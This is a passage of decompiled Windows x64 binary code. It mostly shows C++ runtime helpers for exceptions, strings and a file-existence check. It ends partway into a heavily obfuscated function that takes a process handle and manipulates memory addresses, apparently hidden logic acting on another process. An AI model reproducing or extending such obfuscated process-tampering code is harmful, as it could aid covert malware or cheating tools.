  }
  return param_1;
}



/* ==================================================================== */
/* FUN_14000eea0 @ 14000eea0 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 * FUN_14000eea0(undefined8 param_1,undefined8 *param_2,undefined4 param_3)

{
  char *pcVar1;
  longlong lVar2;
  undefined1 auStack_48 [40];
  char *local_20;
  longlong local_18;
  ulonglong local_10;

  local_10 = DAT_14005d040 ^ (ulonglong)auStack_48;
  local_20 = (char *)0x0;
  local_18 = FUN_140050f04(param_3,&local_20);
  if ((local_20 == (char *)0x0) || (local_18 == 0)) {
    lVar2 = 0xd;
    pcVar1 = "unknown error";
  }
  else {
    pcVar1 = local_20;
    lVar2 = local_18;
  }
  *param_2 = 0;
  param_2[1] = 0;
  param_2[2] = 0;
  param_2[3] = 0;
  FUN_140024ce0(param_2,pcVar1,lVar2);
  LocalFree(local_20);
  return param_2;
}



/* ==================================================================== */
/* FUN_14000ef40 @ 14000ef40 */

int * FUN_14000ef40(undefined8 param_1,int *param_2,int param_3)

{
  int iVar1;

  if (param_3 == 0) {
    *param_2 = 0;
    *(undefined ***)(param_2 + 2) = &PTR_PTR_140a60ce8;
    return param_2;
  }
  iVar1 = std::_Winerror_map(param_3);
  if (iVar1 == 0) {
    *param_2 = param_3;
    *(undefined ***)(param_2 + 2) = &PTR_PTR_140a60cd8;
    return param_2;
  }
  *param_2 = iVar1;
  *(undefined ***)(param_2 + 2) = &PTR_PTR_140a60ce8;
  return param_2;
}



/* ==================================================================== */
/* FUN_14000efc0 @ 14000efc0 */

undefined4 * FUN_14000efc0(undefined4 *param_1,undefined4 param_2)

{
  *param_1 = param_2;
  *(undefined ***)(param_1 + 2) = &PTR_PTR_140a60cd8;
  return param_1;
}



/* ==================================================================== */
/* FUN_14000efe0 @ 14000efe0 */

void FUN_14000efe0(undefined4 param_1)

{
  undefined4 *puVar1;
  undefined4 local_58;
  undefined4 uStack_54;
  undefined4 uStack_50;
  undefined4 uStack_4c;
  undefined1 local_48 [16];
  undefined1 local_38 [56];

  puVar1 = (undefined4 *)FUN_14000efc0(local_48,param_1);
  local_58 = *puVar1;
  uStack_54 = puVar1[1];
  uStack_50 = puVar1[2];
  uStack_4c = puVar1[3];
  FUN_14000ec40(local_38,&local_58);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_38,(ThrowInfo *)&DAT_14005a230);
}



/* ==================================================================== */
/* FUN_14000f020 @ 14000f020 */

undefined8 * FUN_14000f020(undefined8 *param_1)

{
  param_1[2] = 0;
  param_1[1] = "bad cast";
  *param_1 = &PTR_FUN_1400571c0;
  return param_1;
}



/* ==================================================================== */
/* FUN_14000f050 @ 14000f050 */

void FUN_14000f050(void)

{
  undefined1 local_28 [40];

  FUN_14000f020(local_28);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_28,(ThrowInfo *)&DAT_14005a100);
}



/* ==================================================================== */
/* FUN_14000f070 @ 14000f070 */

undefined8 * FUN_14000f070(undefined8 *param_1,longlong param_2)

{
  *param_1 = &PTR_FUN_140056e78;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  *param_1 = &PTR_FUN_1400571c0;
  return param_1;
}



/* ==================================================================== */
/* FUN_14000f0b0 @ 14000f0b0 */

void FUN_14000f0b0(longlong param_1)

{
  undefined8 *puVar1;

  if (*(longlong **)(param_1 + 8) != (longlong *)0x0) {
    puVar1 = (undefined8 *)(**(code **)(**(longlong **)(param_1 + 8) + 0x10))();
    if (puVar1 != (undefined8 *)0x0) {
                    /* WARNING: Could not recover jumptable at 0x00014000f0da. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      (**(code **)*puVar1)(puVar1,1,*(code **)*puVar1);
      return;
    }
  }
  return;
}



/* ==================================================================== */
/* FUN_14000f120 @ 14000f120 */

void FUN_14000f120(void)

{
  undefined8 local_28;
  undefined8 uStack_20;
  undefined8 local_18;

  local_28 = 0;
  uStack_20 = 0;
  local_18 = 0;
  FUN_14000f150(&local_28);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(&local_28,(ThrowInfo *)&DAT_14005a278);
}



/* ==================================================================== */
/* FUN_14000f150 @ 14000f150 */

undefined8 * FUN_14000f150(undefined8 *param_1)

{
  param_1[1] = 0;
  param_1[2] = 0;
  *param_1 = &PTR_FUN_140056f20;
  return param_1;
}



/* ==================================================================== */
/* FUN_14000f170 @ 14000f170 */

undefined8 * FUN_14000f170(undefined8 *param_1,longlong param_2)

{
  *param_1 = &PTR_FUN_140056e78;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  *param_1 = &PTR_FUN_140056f20;
  return param_1;
}



/* ==================================================================== */
/* FUN_14000f1b0 @ 14000f1b0 */

undefined8 * FUN_14000f1b0(undefined8 *param_1,undefined4 param_2,undefined8 *param_3)

{
  ulonglong uVar1;
  ulonglong uVar2;
  undefined8 *puVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  undefined2 *puVar6;

  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 7;
  *(undefined2 *)param_1 = 0;
  uVar2 = param_3[1];
  if (uVar2 != 0) {
    if (0x7fffffff < uVar2) {
                    /* WARNING: Subroutine does not return */
      FUN_14000ed00();
    }
    uVar2 = FUN_14005100c(param_2,*param_3,uVar2,0,0);
    if ((int)(uVar2 >> 0x20) != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_14000efe0(uVar2 >> 0x20);
    }
    uVar1 = param_1[2];
    uVar5 = (ulonglong)(int)uVar2;
    if (uVar1 < uVar5) {
      uVar4 = uVar5 - uVar1;
      if (param_1[3] - uVar1 < uVar4) {
        FUN_140025670(param_1,uVar4);
      }
      else {
        param_1[2] = uVar5;
        puVar3 = param_1;
        if (7 < (ulonglong)param_1[3]) {
          puVar3 = (undefined8 *)*param_1;
        }
        puVar6 = (undefined2 *)((longlong)puVar3 + uVar1 * 2);
        if (uVar4 != 0) {
          for (; uVar4 != 0; uVar4 = uVar4 - 1) {
            *puVar6 = 0;
            puVar6 = puVar6 + 1;
          }
        }
        *(undefined2 *)((longlong)puVar3 + uVar5 * 2) = 0;
      }
    }
    else {
      param_1[2] = uVar5;
      puVar3 = param_1;
      if (7 < (ulonglong)param_1[3]) {
        puVar3 = (undefined8 *)*param_1;
      }
      *(undefined2 *)((longlong)puVar3 + uVar5 * 2) = 0;
    }
    puVar3 = param_1;
    if (7 < (ulonglong)param_1[3]) {
      puVar3 = (undefined8 *)*param_1;
    }
    uVar2 = FUN_14005100c(param_2,*param_3,*(undefined4 *)(param_3 + 1),puVar3,(int)uVar2);
    if ((int)(uVar2 >> 0x20) != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_14000efe0(uVar2 >> 0x20);
    }
  }
  return param_1;
}



/* ==================================================================== */
/* thunk_FUN_140023190 @ 14000f310 */

void thunk_FUN_140023190(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  if (7 < (ulonglong)param_1[3]) {
    pvVar1 = (void *)*param_1;
    _Memory = pvVar1;
    if ((0xfff < param_1[3] * 2 + 2U) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  param_1[3] = 7;
  param_1[2] = 0;
  *(undefined2 *)param_1 = 0;
  return;
}



/* ==================================================================== */
/* FUN_14000f320 @ 14000f320 */

undefined8 * FUN_14000f320(undefined8 *param_1,undefined8 *param_2)

{
  ulonglong uVar1;
  undefined8 uVar2;
  ulonglong uVar3;
  void *_Dst;
  ulonglong uVar4;

  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  uVar1 = param_2[2];
  if (7 < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  if (0x7ffffffffffffffe < uVar1) {
                    /* WARNING: Subroutine does not return */
    FUN_14000eb00();
  }
  if (uVar1 < 8) {
    param_1[2] = uVar1;
    param_1[3] = 7;
    uVar2 = param_2[1];
    *param_1 = *param_2;
    param_1[1] = uVar2;
    return param_1;
  }
  uVar3 = uVar1 | 7;
  if (uVar3 < 0x7fffffffffffffff) {
    if (uVar3 < 10) {
      uVar3 = 10;
    }
    uVar4 = uVar3 + 1;
    if (0x7fffffffffffffff < uVar4) {
                    /* WARNING: Subroutine does not return */
      FUN_140009c90();
    }
  }
  else {
    uVar4 = 0x7fffffffffffffff;
    uVar3 = 0x7ffffffffffffffe;
  }
  _Dst = (void *)FUN_14000e6b0(uVar4 * 2);
  *param_1 = _Dst;
  param_1[2] = uVar1;
  param_1[3] = uVar3;
  memcpy(_Dst,param_2,uVar1 * 2 + 2);
  return param_1;
}



/* ==================================================================== */
/* FUN_14000f410 @ 14000f410 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 *
FUN_14000f410(undefined8 *param_1,undefined8 param_2,undefined8 param_3,ulonglong *param_4)

{
  ulonglong uVar1;
  longlong *plVar2;
  undefined8 **ppuVar3;
  undefined8 ***pppuVar4;
  undefined1 auStack_108 [32];
  undefined8 ***local_e8;
  undefined8 uStack_e0;
  undefined8 local_d8;
  ulonglong uStack_d0;
  undefined8 ***local_c8;
  undefined8 *puStack_c0;
  undefined8 *local_b8;
  undefined8 *puStack_b0;
  undefined8 *local_a8;
  undefined1 local_98 [32];
  undefined8 ***local_78;
  longlong local_70;
  ulonglong local_68;

  local_68 = DAT_14005d040 ^ (ulonglong)auStack_108;
  uVar1 = *param_4;
  plVar2 = (longlong *)param_4[1];
  local_a8 = param_1;
  ppuVar3 = (undefined8 **)FUN_140023590(local_98);
  local_78 = (undefined8 ***)ppuVar3;
  if (ppuVar3[2] != (undefined8 *)0x0) {
    FUN_140025120(ppuVar3,&DAT_140057050,2);
  }
  (**(code **)(*plVar2 + 0x10))(plVar2,&local_e8,uVar1 & 0xffffffff);
  pppuVar4 = &local_e8;
  if (0xf < uStack_d0) {
    pppuVar4 = local_e8;
  }
  FUN_140025120(ppuVar3,pppuVar4,local_d8);
  FUN_140025000(&local_e8);
  local_c8 = (undefined8 ***)*ppuVar3;
  puStack_c0 = ppuVar3[1];
  local_b8 = ppuVar3[2];
  puStack_b0 = ppuVar3[3];
  *(undefined1 *)ppuVar3 = 0;
  ppuVar3[2] = (undefined8 *)0x0;
  ppuVar3[3] = (undefined8 *)0xf;
  FUN_140025000(ppuVar3);
  local_78 = &local_c8;
  if ((undefined8 *)0xf < puStack_b0) {
    local_78 = local_c8;
  }
  *param_1 = &PTR_FUN_140056e78;
  param_1[1] = 0;
  param_1[2] = 0;
  local_70 = CONCAT71(local_70._1_7_,1);
  __std_exception_copy(&local_78,param_1 + 1);
  *param_1 = &PTR_FUN_140056fc0;
  FUN_140025000(&local_c8);
  param_1[3] = uVar1;
  param_1[4] = plVar2;
  *param_1 = &PTR_FUN_1400570d0;
  FUN_14000f320(param_1 + 5,param_3);
  param_1[9] = 0;
  param_1[10] = 0;
  param_1[0xb] = 0;
  param_1[0xc] = 7;
  *(undefined2 *)(param_1 + 9) = 0;
  uStack_e0 = 0;
  local_d8 = 0;
  uStack_d0 = 7;
  local_e8 = (undefined8 ***)0x0;
  local_78 = (undefined8 ***)"Unknown exception";
  if ((undefined8 **)param_1[1] != (undefined8 **)0x0) {
    local_78 = (undefined8 ***)param_1[1];
  }
  local_70 = -1;
  do {
    local_70 = local_70 + 1;
  } while (*(char *)((longlong)local_78 + local_70) != '\0');
  FUN_14000f620(param_1 + 0xd,&local_78,param_3,&local_e8);
  FUN_140023190(&local_e8);
  return param_1;
}



/* ==================================================================== */
/* FUN_14000f620 @ 14000f620 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 *
FUN_14000f620(undefined8 *param_1,undefined8 *param_2,undefined8 *param_3,undefined8 *param_4)

{
  undefined4 uVar1;
  longlong lVar2;
  undefined8 ****ppppuVar3;
  undefined1 auStack_b8 [32];
  undefined4 local_98;
  undefined8 *local_88;
  undefined8 local_80;
  undefined8 *local_78;
  undefined8 ****local_70 [2];
  longlong local_60;
  ulonglong local_58;
  undefined8 ****local_50 [2];
  longlong local_40;
  ulonglong local_38;
  ulonglong local_30;

  local_30 = DAT_14005d040 ^ (ulonglong)auStack_b8;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0xf;
  *(undefined1 *)param_1 = 0;
  local_98 = 1;
  local_78 = param_1;
  uVar1 = FUN_140050fe4();
  local_88 = param_3;
  if (7 < (ulonglong)param_3[3]) {
    local_88 = (undefined8 *)*param_3;
  }
  local_80 = param_3[2];
  FUN_140022cf0(local_50,uVar1,&local_88);
  local_88 = param_4;
  if (7 < (ulonglong)param_4[3]) {
    local_88 = (undefined8 *)*param_4;
  }
  local_80 = param_4[2];
  FUN_140022cf0(local_70,uVar1,&local_88);
  lVar2 = 8;
  if (local_60 == 0) {
    lVar2 = 4;
  }
  FUN_140023210(param_1,lVar2 + param_2[1] + local_40 + local_60);
  FUN_140025120(param_1,*param_2,param_2[1]);
  FUN_140025120(param_1,&DAT_14005708c,3);
  ppppuVar3 = local_50;
  if (0xf < local_38) {
    ppppuVar3 = local_50[0];
  }
  FUN_140025120(param_1,ppppuVar3,local_40);
  if (local_60 != 0) {
    FUN_140025120(param_1,&DAT_140057090,4);
    ppppuVar3 = local_70;
    if (0xf < local_58) {
      ppppuVar3 = local_70[0];
    }
    FUN_140025120(param_1,ppppuVar3,local_60);
  }
  FUN_140023330(param_1,0x22);
  FUN_140025000(local_70);
  FUN_140025000(local_50);
  return param_1;
}



/* ==================================================================== */
/* FUN_14000f7b0 @ 14000f7b0 */

undefined8 * FUN_14000f7b0(undefined8 *param_1,ulonglong param_2)

{
  FUN_140025000(param_1 + 0xd);
  FUN_140023190(param_1 + 9);
  FUN_140023190(param_1 + 5);
  *param_1 = &PTR_FUN_140056e78;
  __std_exception_destroy(param_1 + 1);
  if ((param_2 & 1) != 0) {
    free(param_1);
  }
  return param_1;
}



/* ==================================================================== */
/* FUN_14000f810 @ 14000f810 */

void FUN_14000f810(undefined8 *param_1)

{
  FUN_140025000(param_1 + 0xd);
  FUN_140023190(param_1 + 9);
  FUN_140023190(param_1 + 5);
  *param_1 = &PTR_FUN_140056e78;
                    /* WARNING: Could not recover jumptable at 0x00014000f847. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  __std_exception_destroy(param_1 + 1);
  return;
}



/* ==================================================================== */
/* FUN_14000f850 @ 14000f850 */

undefined8 * FUN_14000f850(undefined8 *param_1,longlong param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;

  *param_1 = &PTR_FUN_140056e78;
  param_1[1] = 0;
  param_1[2] = 0;
  __std_exception_copy(param_2 + 8);
  *param_1 = &PTR_FUN_140056fd8;
  uVar1 = *(undefined4 *)(param_2 + 0x1c);
  uVar2 = *(undefined4 *)(param_2 + 0x20);
  uVar3 = *(undefined4 *)(param_2 + 0x24);
  *(undefined4 *)(param_1 + 3) = *(undefined4 *)(param_2 + 0x18);
  *(undefined4 *)((longlong)param_1 + 0x1c) = uVar1;
  *(undefined4 *)(param_1 + 4) = uVar2;
  *(undefined4 *)((longlong)param_1 + 0x24) = uVar3;
  *param_1 = &PTR_FUN_1400570d0;
  FUN_14000f320(param_1 + 5,param_2 + 0x28);
  FUN_14000f320(param_1 + 9,param_2 + 0x48);
  FUN_140023590(param_1 + 0xd,param_2 + 0x68);
  return param_1;
}



/* ==================================================================== */
/* FUN_14000f8e0 @ 14000f8e0 */

void FUN_14000f8e0(undefined8 param_1,undefined4 *param_2,undefined8 param_3)

{
  undefined4 local_c8;
  undefined4 uStack_c4;
  undefined4 uStack_c0;
  undefined4 uStack_bc;
  undefined1 local_b8 [32];
  undefined1 local_98 [144];

  local_c8 = *param_2;
  uStack_c4 = param_2[1];
  uStack_c0 = param_2[2];
  uStack_bc = param_2[3];
  FUN_140023550(local_b8,"exists");
  FUN_14000f410(local_98,local_b8,param_3,&local_c8);
                    /* WARNING: Subroutine does not return */
  _CxxThrowException(local_98,(ThrowInfo *)&DAT_14005a2d8);
}



/* ==================================================================== */
/* FUN_14000f940 @ 14000f940 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

bool FUN_14000f940(undefined8 *param_1)

{
  uint uVar1;
  undefined8 *puVar2;
  bool bVar3;
  undefined1 auStack_58 [32];
  uint local_38 [2];
  undefined **ppuStack_30;
  uint local_28;
  int local_24;
  ulonglong local_18;

  local_18 = DAT_14005d040 ^ (ulonglong)auStack_58;
  puVar2 = param_1;
  if (7 < (ulonglong)param_1[3]) {
    puVar2 = (undefined8 *)*param_1;
  }
  local_38[0] = FUN_140051130(puVar2,local_38,3,0xffffffff);
  if (local_38[0] == 0) {
    if ((local_28 >> 10 & 1) != 0) {
      if (local_24 == -0x5ffffff4) {
        uVar1 = 4;
        goto LAB_14000f9ff;
      }
      if (local_24 == -0x5ffffffd) {
        uVar1 = 10;
        goto LAB_14000f9ff;
      }
    }
    uVar1 = (local_28 & 0x10 | 0x20) >> 4;
  }
  else {
    if (local_38[0] < 0x41) {
      if (((local_38[0] != 0x40) && (local_38[0] != 2)) && (local_38[0] != 3)) {
        bVar3 = local_38[0] == 0x35;
LAB_14000f9d5:
        if (!bVar3) {
          uVar1 = 0;
          goto LAB_14000f9e0;
        }
      }
    }
    else if (local_38[0] != 0x7b) {
      bVar3 = local_38[0] == 0x10b;
      goto LAB_14000f9d5;
    }
    uVar1 = 1;
  }
LAB_14000f9e0:
  ppuStack_30 = &PTR_PTR_140a60cd8;
  if (uVar1 == 0) {
    if (local_38[0] != 0) {
                    /* WARNING: Subroutine does not return */
      FUN_14000f8e0(0,local_38,param_1);
    }
    return false;
  }
LAB_14000f9ff:
  return uVar1 != 1;
}



/* ==================================================================== */
/* FUN_14000fa30 @ 14000fa30 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */

undefined8 * FUN_14000fa30(longlong param_1,undefined8 *param_2,undefined8 *param_3)

{
  undefined8 *puVar1;
  ulonglong uVar2;
  size_t sVar3;
  size_t sVar4;
  undefined1 uVar5;
  int iVar6;
  undefined8 *puVar7;
  undefined8 *puVar8;
  undefined8 *puVar9;
  undefined1 auStack_a8 [40];
  undefined8 *local_80;
  undefined1 local_78;
  undefined7 uStack_77;
  undefined8 uStack_70;
  undefined8 local_68;
  undefined8 uStack_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined1 local_48;
  ulonglong local_40;

  local_40 = DAT_14005d040 ^ (ulonglong)auStack_a8;
  puVar9 = *(undefined8 **)(param_1 + 0x38);
  puVar1 = *(undefined8 **)(param_1 + 0x40);
  local_80 = param_2;
  if (puVar9 != puVar1) {
    uVar2 = param_3[3];
    sVar3 = param_3[2];
    do {
      puVar8 = param_3;
      if (0xf < uVar2) {
        puVar8 = (undefined8 *)*param_3;
      }
      sVar4 = puVar9[2];
      puVar7 = puVar9;
      if (0xf < (ulonglong)puVar9[3]) {
        puVar7 = (undefined8 *)*puVar9;
      }
      if ((sVar4 == sVar3) && ((sVar4 == 0 || (iVar6 = memcmp(puVar7,puVar8,sVar4), iVar6 == 0)))) {
        FUN_140023590(&local_78,puVar9);
        local_58 = puVar9[4];
        local_50 = puVar9[5];
        *param_2 = CONCAT71(uStack_77,local_78);
        param_2[1] = uStack_70;
        local_48 = 1;
        *(undefined4 *)(param_2 + 2) = (undefined4)local_68;
        *(undefined4 *)((longlong)param_2 + 0x14) = local_68._4_4_;
        *(undefined4 *)(param_2 + 3) = (undefined4)uStack_60;
        *(undefined4 *)((longlong)param_2 + 0x1c) = uStack_60._4_4_;
        param_2[5] = local_50;
        local_68 = 0;
        uStack_60 = 0xf;
        local_78 = 0;
        param_2[4] = local_58;
        *(undefined1 *)(param_2 + 6) = 1;
        FUN_140025000(&local_78);
        return param_2;
      }
      puVar9 = puVar9 + 6;
    } while (puVar9 != puVar1);
  }
  FUN_140039760(param_1);
  puVar9 = *(undefined8 **)(param_1 + 0x38);
  puVar1 = *(undefined8 **)(param_1 + 0x40);
  if (puVar9 != puVar1) {
    uVar2 = param_3[3];
    sVar3 = param_3[2];
    do {
      puVar8 = param_3;
      if (0xf < uVar2) {
        puVar8 = (undefined8 *)*param_3;
      }
      sVar4 = puVar9[2];
      puVar7 = puVar9;
      if (0xf < (ulonglong)puVar9[3]) {
        puVar7 = (undefined8 *)*puVar9;
      }
      if ((sVar4 == sVar3) && ((sVar4 == 0 || (iVar6 = memcmp(puVar7,puVar8,sVar4), iVar6 == 0)))) {
        FUN_140023590(param_2,puVar9);
        param_2[4] = puVar9[4];
        param_2[5] = puVar9[5];
        uVar5 = 1;
        goto LAB_14000fb17;
      }
      puVar9 = puVar9 + 6;
    } while (puVar9 != puVar1);
  }
  uVar5 = 0;
LAB_14000fb17:
  *(undefined1 *)(param_2 + 6) = uVar5;
  return param_2;
}



/* ==================================================================== */
/* FUN_14000fbd0 @ 14000fbd0 */

void FUN_14000fbd0(longlong *param_1)

{
  void *pvVar1;
  void *_Memory;

  if ((char)param_1[6] == '\0') {
    return;
  }
  if (0xf < (ulonglong)param_1[3]) {
    pvVar1 = (void *)*param_1;
    _Memory = pvVar1;
    if ((0xfff < param_1[3] + 1U) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    /* WARNING: Subroutine does not return */
      _invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    }
    free(_Memory);
  }
  param_1[2] = 0;
  param_1[3] = 0xf;
  *(undefined1 *)param_1 = 0;
  return;
}



/* ==================================================================== */
/* FUN_14000fbe0 @ 14000fbe0 */

void FUN_14000fbe0(longlong param_1)

{
  FUN_14000e3a0(param_1 + 0x18);
  FUN_14000e300(param_1);
  return;
}



/* ==================================================================== */
/* FUN_14000fc00 @ 14000fc00 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000fc00(void)

{
  _DAT_10000000108 = (*_DAT_10000000100)(0x10000000000);
  return;
}



/* ==================================================================== */
/* FUN_14000fc30 @ 14000fc30 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_14000fc30(undefined8 param_1,undefined8 param_2,undefined8 param_3)

{
  (*_DAT_100000008)();
  DAT_100000010 = 1;
                    /* WARNING: Could not recover jumptable at 0x00014000fc84. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*_DAT_100000000)(param_1,param_2,param_3);
  return;
}



/* ==================================================================== */
/* FUN_14000fc90 @ 14000fc90 */

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_14000fc90(longlong param_1,undefined8 param_2)

{
  ulonglong uVar1;
  byte bVar2;
  HANDLE hProcess;
  uint uVar3;
  int iVar4;
  LPCVOID lpBaseAddress;
  LPVOID lpAddress;
  LPVOID lpBaseAddress_00;
  byte bVar5;
  byte bVar6;
  ulonglong uVar7;
  undefined4 *puVar8;
  undefined8 uVar9;
  char cVar10;
  ulonglong uVar11;
  longlong lVar12;
  ulonglong uVar13;
  ulonglong uVar14;
  byte bVar15;
  char cVar16;
  ulonglong uVar17;
  longlong lVar18;
  DWORD in_stack_0044ae9d;
  DWORD in_stack_00763d14;
  undefined8 in_stack_008449ae;
  int in_stack_00988c99;
  DWORD in_stack_00f588af;
  DWORD in_stack_011772be;
  DWORD in_stack_011b2dcd;
  DWORD in_stack_0144ea04;
  undefined8 in_stack_01455f70;
  DWORD in_stack_0151570c;
  DWORD in_stack_0153fbb0;
  DWORD in_stack_0159e974;
  DWORD in_stack_015c3884;
  int in_stack_016ae784;
  DWORD in_stack_0171c9b4;
  DWORD in_stack_01731511;
  DWORD in_stack_0176aa38;
  DWORD in_stack_017cc1c9;
  undefined1 auStackY_338 [32];
  undefined1 local_300 [39];
  byte bStack_2d9;
  DWORD local_2d8;
  undefined8 local_2d4;
  undefined8 uStack_2cc;
  undefined2 local_2c4;
  undefined1 local_2c2;
  byte bStack_2b9;
  DWORD local_2b8;
  undefined8 local_2b4;
  undefined8 uStack_2ac;
  undefined2 local_2a4;
  undefined1 local_2a2;
  byte bStack_299;
  int local_298;
  undefined8 local_294;
  undefined8 uStack_28c;
  undefined4 local_284;
  undefined2 local_280;
  undefined1 local_27e;
  byte bStack_279;
  DWORD local_278;
  undefined8 local_274;
  undefined4 local_26c;
  undefined1 local_268;
  byte bStack_259;
  DWORD local_258;
  undefined8 local_254;
  undefined8 uStack_24c;
  undefined4 local_244;
  byte bStack_239;
  undefined4 local_238;
  undefined4 uStack_234;
  undefined8 local_230;
  undefined4 local_228;
  byte bStack_219;
  undefined4 local_218;
  undefined4 local_214;
  undefined2 local_210;
  undefined1 local_20e;
  undefined8 local_20d;
  undefined2 local_205;
  undefined1 local_203;
  undefined1 local_1f8 [31];
  byte bStack_1d9;
  DWORD local_1d8;
  undefined8 local_1d4;
  undefined4 local_1cc;
  undefined2 local_1c8;
  byte bStack_1b9;
  DWORD local_1b8;
  undefined8 local_1b4;
  undefined8 uStack_1ac;
  undefined8 local_1a4;
  undefined1 local_19c;
  byte bStack_199;
  DWORD local_198;
  undefined8 local_194;
  undefined8 uStack_18c;
  undefined1 local_184;
  byte bStack_179;
  undefined4 local_178;
  undefined4 local_174;
  undefined4 local_170;
  undefined4 local_16c;
  undefined4 local_168;
  undefined1 local_164;
  undefined8 local_163;
  undefined8 uStack_15b;
  undefined2 local_153;
  longlong local_148 [2];
  undefined8 local_138;
  undefined8 local_130;
  undefined8 local_128;
  byte local_120 [8];
  longlong *local_118;
  longlong local_110;
  undefined8 local_108;
  longlong local_100;
  undefined8 local_f8;
  undefined8 local_f0;
  undefined8 local_e8;
  LPVOID local_e0;
  LPVOID local_d8;
  longlong local_d0;
  LPCVOID local_c8;
  longlong lStack_c0;
  undefined8 local_b8;
  undefined1 local_b0 [32];
  longlong local_90;
  char local_80;
  undefined1 local_78 [32];
  LPVOID local_58;
  ulonglong local_40;

  local_40 = DAT_14005d040 ^ (ulonglong)auStackY_338;
  local_148[0] = param_1;
  hProcess = *(HANDLE *)(*(longlong *)(param_1 + 0x58) + 0x30);
  local_178 = 0x71a0834;
  local_174 = 0x32cf50b;
  local_170 = 0x117fa1d;
  local_16c = 0x14001230;
  local_168 = 0xec00ee48;
  local_164 = 0x8a;
  local_163 = 0;
  uStack_15b = 0;
  local_153 = 0;
  bVar15 = local_120[0];
LAB_14000fd40:
  uVar7 = DAT_140a618d0;
  uVar14 = DAT_140a618c8;
LAB_14000fd50:
  uVar11 = 0;
  uVar13 = uVar7;
LAB_14000fd53:
  if (uVar11 < 0x27) {
    bVar2 = *(byte *)((longlong)local_148 + (uVar11 - 0x30));
    cVar10 = (char)uVar11;
LAB_14000fd70:
    if (uVar11 < uVar14) {
      puVar8 = (undefined4 *)(auStackY_338 + 0x550943);
      goto LAB_1400106de;
    }
    if (uVar13 + 1 <= uVar14) {
      if (uVar14 != uVar13 + 1) {
        if (uVar14 == uVar13 + 3) {
          bVar15 = cVar10 + 0x67U + bVar2 + (bVar2 & cVar10 + 0x67U) * -2 + 0x2f;
        }
        else {
          if (uVar14 != uVar13 + 5) goto LAB_14000fdc0;
          bVar15 = cVar10 + 0x45U + bVar2 + (bVar2 & cVar10 + 0x45U) * -2 + 0x1d;
          uVar14 = uVar14 + uVar13;
        }
        goto LAB_14001064d;
      }
      bVar15 = (cVar10 - 0x33U) + bVar2 + (bVar2 & cVar10 - 0x33U) * -2 + 0x65;
      uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x30)) + uVar13 + 1;
      goto LAB_14000fd53;
    }
    bVar15 = (cVar10 - 0x11U) + (cVar10 - 0x11U & bVar2) * -2 + 'w' + bVar2;
LAB_14000fdc0:
    if (uVar11 < uVar13) {
      puVar8 = (undefined4 *)(auStackY_338 + 0x1704a54);
      goto LAB_1400106de;
    }
    if (uVar13 + 10 <= uVar14) {
      if (uVar14 == uVar13 + 1) {
        bVar15 = cVar10 + 0x79;
        cVar16 = '\x15';
        goto LAB_1400105e2;
      }
      if (uVar14 != uVar13 + 3) {
        if (uVar14 != uVar13 + 7) goto LAB_14000fe12;
        bVar15 = (bVar2 + cVar10 + (cVar10 + 0xadU & bVar2) * -2) - 0xe;
        goto LAB_140010551;
      }
      bVar15 = ('-' - (cVar10 - 0xfU & bVar2)) * '\x02' + cVar10 + bVar2;
      uVar14 = uVar14 + uVar13;
      goto LAB_14001064d;
    }
    bVar15 = ('/' - (cVar10 + 0x9bU & bVar2)) * '\x02' + cVar10 + bVar2;
LAB_14000fe12:
    while (uVar7 = uVar13, uVar11 < uVar13 + uVar14) {
      while( true ) {
        do {
          uVar13 = uVar7;
          if (uVar14 == uVar13 + 0x400) {
            bVar15 = (bVar2 + cVar10 + (cVar10 + 0xb2U & bVar2) * -2) - 0x2c;
            goto LAB_1400105f1;
          }
          if (uVar14 == uVar13 + 5) {
            bVar15 = bVar2 + cVar10 + (cVar10 + 0x90U & bVar2) * -2 + 0xa0;
            uVar13 = uVar13 + 1;
            goto LAB_14000fd53;
          }
          if (uVar14 == uVar13 + 8) {
            bVar15 = ('6' - (cVar10 + 0x6eU & bVar2)) * '\x02' + cVar10 + bVar2;
            goto LAB_14000fd53;
          }
          if (uVar14 == uVar13 + 1000) {
            bVar15 = ('\x1c' - (cVar10 + 0x4cU & bVar2)) * '\x02' + cVar10 + bVar2;
            goto LAB_140010501;
          }
